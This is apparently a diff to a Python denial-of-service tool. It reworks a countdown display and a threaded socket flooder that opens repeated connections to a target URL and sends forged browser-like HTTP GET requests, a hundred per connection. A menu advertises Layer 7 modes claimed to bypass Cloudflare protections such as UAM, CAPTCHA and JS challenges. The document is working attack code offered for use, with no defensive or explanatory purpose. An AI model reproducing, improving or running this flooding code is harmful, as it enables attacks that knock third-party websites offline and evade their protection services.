@@ -13,14 +13,22 @@ init(convert=True)
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while (until - datetime.datetime.now()).total_seconds() > 0:
-        stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left")
+    while True:
+        l = (until - datetime.datetime.now()).total_seconds()
+        if l <= 0:
+            stdout.write("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!\n")
+            break;
+        else: stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str(l) + "sec left")
         stdout.flush()
-    stdout.flush()
-    print("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!")
+        
+    #while (until - datetime.datetime.now()).total_seconds() > 0:
+    #    stdout.flush()
+    #    stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left")
+    #    stdout.flush()
+    #stdout.flush()
+    #stdout.write("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!\n")
 
 #region RAW
-request_list = []
 def LaunchRAW(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     threads_count = 0
@@ -43,32 +51,29 @@ def AttackRAW(url, until_datetime):
 
 #region SOC
 def LaunchSOC(url, port, th, t):
-    global request
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     threads_count = 0
-    get_host   = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    useragent  = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
-    accept     = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-    connection = "Connection: Keep-Alive\r\n"
-    request    = get_host + useragent + accept + connection + "\r\n"
-    request_list.append(request)
+    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\n\r\n"
     while threads_count <= int(th):
         try:
-            thd = threading.Thread(target=AttackSOC, args=(url, port, until))
+            thd = threading.Thread(target=AttackSOC, args=(url, port, until, req))
             thd.start()
             threads_count += 1
         except:
             pass
 
-def AttackSOC(url, port, until_datetime):
+def AttackSOC(url, port, until_datetime, req):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((urlparse(url).netloc, int(port)))
-            s.send(str.encode(request))
+            s.send(str.encode(req))
             try:
                 for _ in range(100):
-                    s.send(str.encode(request))
+                    s.send(str.encode(req))
             except:
                 s.close()
         except:
@@ -421,7 +426,7 @@ def command():
 def funcc():
 	print(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]")
 	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
+	#print(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
 	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)")
 	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)")
 	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack")
